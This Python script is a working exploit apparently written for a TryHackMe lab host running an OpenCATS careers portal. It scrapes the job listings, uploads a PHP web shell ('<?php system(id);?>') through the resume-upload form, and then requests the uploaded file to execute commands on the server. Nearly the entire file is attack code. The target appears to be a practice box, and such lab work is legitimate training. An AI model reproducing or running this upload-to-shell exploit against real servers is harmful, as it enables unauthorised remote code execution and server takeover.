import requests
from bs4 import BeautifulSoup

# Define the URL to scrape
url = "http://job.empline.thm/careers/index.php?m=careers&p=showAll"
url1="http://job.empline.thm/careers/index.php?m=careers&p=showJob&ID=1"


headers = {
    'Host': 'job.empline.thm',
    # 'Content-Length': '603',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://job.empline.thm',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryezy5JAeYId7gpX36',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://job.empline.thm/careers/index.php?m=careers&p=onApplyToJobOrder',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'close',
    # 'Cookie': 'cats1cw=%22firstName%22%3D%22a%22%22lastName%22%3D%22a%22%22email%22%3D%22a%2540a.com%22%22address%22%3D%22%22%22city%22%3D%22a%2540a.com%22%22state%22%3D%22a%2540a.com%22%22zip%22%3D%22a%2540a.com%22%22phone%22%3D%22%22%22phoneHome%22%3D%22%22%22phoneCell%22%3D%22%22; CATS=em1ckj47hbvt5uujkvoi2540e1',
}

params = {
    'm': 'careers',
    'p': 'onApplyToJobOrder',
}
# cookies = {
#     'cats1cw': '%22firstName%22%3D%22a%22%22lastName%22%3D%22a%22%22email%22%3D%22a%2540a.com%22%22address%22%3D%22%22%22city%22%3D%22a%2540a.com%22%22state%22%3D%22a%2540a.com%22%22zip%22%3D%22a%2540a.com%22%22phone%22%3D%22%22%22phoneHome%22%3D%22%22%22phoneCell%22%3D%22%22',
#     'CATS': 'em1ckj47hbvt5uujkvoi2540e1',
# }

data = '------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="ID"\r\n\r\n1\r\n------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="candidateID"\r\n\r\n-1\r\n------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="applyToJobSubAction"\r\n\r\nresumeLoad\r\n------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="file"\r\n\r\naaa.php\r\n------WebKitFormBoundaryezy5JAeYId7gpX36\r\nContent-Disposition: form-data; name="resumeFile"; filename="aaaa.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system(id);?>\r\n------WebKitFormBoundaryezy5JAeYId7gpX36--\r\n'

# Send an HTTP GET request to the URL
response = requests.get(url)

# Check if the request was successful (status code 200)
if response.status_code == 200:
    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(response.text, 'html.parser')
    # Find the elements containing the desired text
    openings_element = soup.find('div', {'id': 'careerContent'}).find('h1')
    print(openings_element.text.strip())
    # Current Available Openings, Recently Posted Jobs: 1
    availableJobs=int(openings_element.text.strip().split(': ')[1])
    if availableJobs > 0:
        print(f"total jobs are: {availableJobs}")
        print(f"Trying to upload revshell to {availableJobs} job id")        
        response1= requests.post(
            'http://job.empline.thm/careers/index.php',
            params=params,
            headers=headers,
            data=data,
            verify=False,
        )
        print(response1)
        if response1.status_code == 200:
            if "will still be uploaded" in response1.text:
                print("[*] Exploit Uploaded successfully")
                id=requests.get('http://job.empline.thm/upload/careerportaladd/aaaa_Copy3.php')
                print(id.text)
        else:
            print("unable to exploit the server", response.status_code)


else:
    print("Failed to retrieve the webpage. Status code:", response.status_code)
